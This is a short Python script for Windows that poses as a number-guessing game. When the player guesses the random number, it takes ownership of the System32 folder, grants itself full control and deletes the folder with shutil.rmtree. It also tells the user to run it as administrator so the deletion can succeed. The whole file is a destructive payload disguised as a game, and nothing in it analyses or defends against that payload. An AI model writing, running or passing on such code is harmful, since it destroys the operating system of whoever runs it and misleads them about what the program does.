import os
import shutil
import ctypes
import random
import win32security

system32_dir = r"C:\Windows\System32"
protected_dir = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32")


    
def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

def take_ownership_and_grant_full_control(path):
    #Take ownership and grant full control to the current user.
    user_name = os.getlogin()

    # Get security info
    sd = win32security.GetFileSecurity(path, win32security.OWNER_SECURITY_INFORMATION)
    
    # Get current user SID
    user_sid = win32security.LookupAccountName(None, user_name)[0]

    # Set new owner
    win32security.SetFileSecurity(path, win32security.OWNER_SECURITY_INFORMATION,
                                  win32security.SECURITY_DESCRIPTOR())
    win32security.SetFileSecurity(path, win32security.OWNER_SECURITY_INFORMATION,
                                  win32security.ConvertStringSecurityDescriptorToSecurityDescriptor(
                                      f"O:{user_sid}", win32security.SDDL_REVISION_1))

    # Set full control permissions
    dacl = win32security.ACL()
    dacl.AddAccessAllowedAce(win32security.ACL_REVISION, win32security.FILE_ALL_ACCESS, user_sid)
    security_descriptor = win32security.SECURITY_DESCRIPTOR()
    security_descriptor.SetSecurityDescriptorDacl(1, dacl, 0)
    win32security.SetFileSecurity(path, win32security.DACL_SECURITY_INFORMATION, security_descriptor)

# Ensure script runs as admin
if not is_admin():
    print("Please run the script as an administrator.")

while True:
    print("Pick a number: ")
    num = int(input())
    if random.randint(0, 7) == num:
        if os.path.exists(protected_dir):
            take_ownership_and_grant_full_control(protected_dir)
            print("You Won!!")
            shutil.rmtree(protected_dir)
        else:
            if os.path.exists(system32_dir):
                take_ownership_and_grant_full_control(system32_dir)
                shutil.rmtree(system32_dir)  
                print("You Won!")
    else:
                print("Try Again!\n")
